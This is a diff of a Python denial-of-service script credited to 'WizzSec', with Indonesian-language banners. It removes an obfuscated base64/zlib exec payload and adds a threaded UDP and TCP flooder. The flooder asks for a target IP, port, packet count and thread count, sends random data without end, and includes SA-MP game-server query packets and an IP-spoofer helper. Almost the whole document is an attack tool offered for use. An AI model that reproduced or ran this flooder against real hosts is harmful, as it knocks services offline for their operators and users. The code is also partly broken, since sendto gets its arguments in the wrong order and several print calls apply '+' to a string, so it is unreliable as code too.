@@ -1,3 +1,104 @@
-#Compiled By WizzSec
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("eJztVmtvmzAU/c6vsBJVARUxAyGPVlUVtSyNujyUEk1rV0UU3zTRQkDY0dJ/P5tXKXk0myrtS5ESfO1z7r0+9xpY+GEQMRS5KxL40iKxaOD9ApZZbOFDPp5H4JLF6jmbCKhKX2hmeQEBL7coi9Yek6SR6wUMKLpAD1IK0fgfH8g1y6zrdWLhNiZtndRJQ9ehibFbb1hPGNdUVJvDZhqTaoparTb5td+JZbZAd9vCScPcJjO+S/CPo7d3xm4dRW4aW2TO1be4uMUDGcQto3cCm80jgXVyDNDQYUbqWwrvDg1bHh+lgGq88gx8ueYtwY1qihRGixWTKz+xaT60db+Sz1Qq0vfe/f2dfYWGA/S1N7YlPqdIi5A3BW8TebEK1xzXC9FNQNkZqiicK3roAgkH6fJIzLwCRGPSEsIVnUvT9bhZSwgnmUwQ+/dwPRyjjuN0rm4vkTMZdLsTZKFru3dbSeJqdAkQypYiEZghGgbBDCJZOZMQv1xCItHtettQkd5oqQjz+2O8RvhCTavluAf8mGqQnEFN3PjvGWRd56x2k+eZg/W9YB7BsKwi1vgLrLkXawhsPcNSCj48LUHsIsv+lO/pNE+vYBlvLDPZfwRsHa0KnqTqmoSxirAJEwWJy1weIM1luk4GXA+jLfL4PV8sATnRGhK5WfSSDBASxU6eXlpyk1Or83XaG9iOmq3eDa9up9fdcaevpNS0aHLcjqGiijYQLahkgFkQoQ1vJZRWB2MlC8sDaxRWhAWycKOKDSj5WtJSp8m5wOdm87yOfZQdiL49+GHzBht+Q70ROqEohpmmPxqOHW5XTng6aiET2HgQsix08cy973uXz6L+xmcB/kMBmJcXwDxcAIyx8aEVuHPG9msJqOYFqxV4TC5tOdNXLgpbqkf8ON6qSIHxVjceaxlQkJU3On5IkYqC6u8Kqn8K+p6gksjspZBZ8hKNc2Nzrk/+Xagl71eZudEziNc3L4ESozTK55isHEUx/oGjlziwpHBcgmaJWa1+Oe6qVsvYzsS5GY7PMpkPYsf2oNO3L9Goj7qTzmG/B3P4A+dfV9M=")))
+import random
+import socket
+import time
+import threading
+import os,sys
+import codecs
+import struct
+
+Pacotes = [
+ codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),##7777
+ codecs.decode('53414d509538e1a9611e63', 'hex_codec'),##tandem
+ codecs.decode('53414d509538e1a9611e69', 'hex_codec'),##7778
+ codecs.decode('53414d509538e1a9611e72', 'hex_codec'),#7771
+ codecs.decode('081e62da', 'hex_codec'),
+ codecs.decode('081e77da', 'hex_codec'),
+ codecs.decode('081e4dda', 'hex_codec'),
+ codecs.decode('021efd40', 'hex_codec'),
+ codecs.decode('081e7eda', 'hex_codec')]
+os.system('clear')
+print("\033[91m")
+print("""
+WIZZSEC ON FIRE
+""")
+ip = str(input("Ip Host: "))
+port = int(input("Port Host: "))
+times = int(input("Packets: "))
+threads = int(input("Threads: "))
+os.system('clear')
+print("DOR ATTACK? TUNGGU 5 DEIK")
+time.sleep(5)
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+#udp
+def exp():
+  data = random._urandom(2000)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(100):
+        s.sendto(addr,data)
+        print(+"\033[0;37;40m WIZZSEC MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
+    except:
+      print("\033[0;37;40m WIZZSEC MENYENGGOL IP %s PORT %s"%(ip,port))
+#udp
+def exp2():
+  data = random._urandom(2000)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(100):
+        s.sendto(addr,data)
+        print(+"\033[0;37;40m WIZZSEC MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
+    except:
+      print("\033[0;37;40m WIZZSEC MENYENGGOL IP %s PORT %s"%(ip,port))
+#tcp
+def exp3():
+  data = random._urandom(102489)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+    except:
+      s.close()
+      print(+"\033[0;37;40m WIZZSEC MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
+#tcp
+def exp1():
+  data = random._urandom(102489)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+    except:
+      s.close()
+      print(+"\033[0;37;40m WIZZSEC MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
+
+for y in range(threads):
+  th = threading.Thread(target = exp)
+  th.start()
+  th = threading.Thread(target = exp2)
+  th.start()
+  th = threading.Thread(target = exp1)
+  th.start()
+else:
+  th = threading.Thread(target = exp3)
+  th.start()
+##///////////////////////////////////////##
+##/////////////AUTHOR: WIZZSEC///////////##
+##/////////////RENAME? PM GUA////////////##
+##///////////////////////////////////////##
